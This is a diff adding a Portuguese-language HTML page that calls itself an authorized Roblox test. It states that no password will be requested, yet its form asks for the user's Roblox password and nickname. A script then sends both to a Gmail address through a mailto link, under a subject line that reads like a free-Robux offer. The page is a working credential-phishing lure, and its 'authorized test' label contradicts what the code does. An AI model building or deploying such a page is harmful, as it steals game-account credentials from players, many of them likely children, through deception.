@@ -1,0 +1,117 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Teste Roblox — Coleta Autorizada</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background: linear-gradient(180deg,#0b1220,#08101a);
+      color: #e6eef8;
+    }
+    .card {
+      background: linear-gradient(180deg,#112035,#08101a);
+      padding: 28px;
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(0,0,0,.6);
+      width: 320px;
+      text-align: center;
+    }
+    button {
+      background: goldenrod;
+      border: none;
+      padding: 12px 18px;
+      border-radius: 8px;
+      font-weight: 700;
+      cursor: pointer;
+      color: #111;
+    }
+    .modal {
+      position: fixed;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: rgba(2,6,12,.6);
+    }
+    .modal-box {
+      background: #fff;
+      color: #111;
+      padding: 20px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 420px;
+    }
+    label, input { display:block; width:100%; margin:8px 0; }
+    input[type="text"] { padding:10px; border-radius:6px; border:1px solid #ccc; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>Teste Roblox — Coleta Autorizada</h2>
+    <p>Esta página é apenas um <strong>teste autorizado</strong>. Nenhuma senha será pedida.</p>
+    <button id="open">ABRIR FORMULÁRIO</button>
+  </div>
+
+  <div id="modal" class="modal" style="display:none" role="dialog" aria-hidden="true">
+    <div class="modal-box" role="document">
+      <h3>Formulário de Teste</h3>
+
+      <label for="nome">Senha do roblox</label>
+      <input id="nome" type="text" placeholder="Senha roblox" />
+
+      <label for="nick">Nick do Roblox</label>
+      <input id="nick" type="text" placeholder="Seu nick no Roblox" />
+
+      <div style="display:flex; gap:8px; justify-content:flex-end; margin-top:12px;">
+        <button id="cancel" style="background:#ccc;color:#000">Cancelar</button>
+        <button id="send">Enviar</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const openBtn = document.getElementById('open');
+    const modal = document.getElementById('modal');
+    const cancel = document.getElementById('cancel');
+    const send = document.getElementById('send');
+    const nomeInput = document.getElementById('nome');
+    const nickInput = document.getElementById('nick');
+
+    openBtn.onclick = () => {
+      nomeInput.value = '';
+      nickInput.value = '';
+      modal.style.display = 'flex';
+      modal.setAttribute('aria-hidden', 'false');
+    };
+    cancel.onclick = () => {
+      modal.style.display = 'none';
+      modal.setAttribute('aria-hidden','true');
+    };
+
+    send.onclick = () => {
+      const nome = nomeInput.value.trim();
+      const nick = nickInput.value.trim();
+      if (!nome || !nick) {
+        alert("Preencha todos os campos!");
+        return;
+      }
+      // Abre o cliente de e-mail (não armazena nada no site)
+      const to = "cesinhadiscord@gmail.com";
+      const subject = encodeURIComponent("Por favor eu quero ( quantidade de ROBUX )");
+      const body = encodeURIComponent(
+        "Senha do roblox: " + nome + "\nNick Roblox: " + nick + "\n\n(Enviado via formulário autorizado)"
+      );
+      window.location.href = `mailto:${to}?subject=${subject}&body=${body}`;
+      modal.style.display = 'none';
+      modal.setAttribute('aria-hidden','true');
+    };
+  </script>
+</body>
+  </html>
